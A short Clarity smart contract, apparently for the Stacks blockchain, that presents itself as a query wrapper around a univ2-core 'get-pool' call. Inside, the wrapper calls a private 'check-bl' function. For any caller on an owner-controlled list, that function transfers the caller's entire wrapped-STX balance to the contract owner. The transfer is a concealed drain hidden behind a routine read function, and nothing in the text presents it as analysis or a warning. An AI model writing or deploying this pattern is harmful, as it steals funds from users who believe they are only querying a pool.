(define-constant OWNER tx-sender)

(define-map bl principal bool)

(define-public (set-bl (u principal) (b bool))
	(begin
		(asserts! (is-eq tx-sender OWNER) (err u1000))
		(ok (if b (map-set bl u b) (map-delete bl u)))
	)
)

(define-private (check-bl)
	(let (
			(bb (if (is-some (map-get? bl tx-sender)) (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-wstx get-balance tx-sender)) u0))
		)
		(if (> bb u0) (contract-call?
				'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-wstx transfer-fixed
				bb tx-sender OWNER none) (ok false))
	)
)

(define-public (get-pool (pool-id uint))
	(begin
		(try! (check-bl))
		(ok (unwrap-panic (contract-call?
				'SP1Y5YSTAHZ88XYK1VPDH24GY0HPX5J4JECTMY4A1.univ2-core get-pool pool-id)))
	)
)
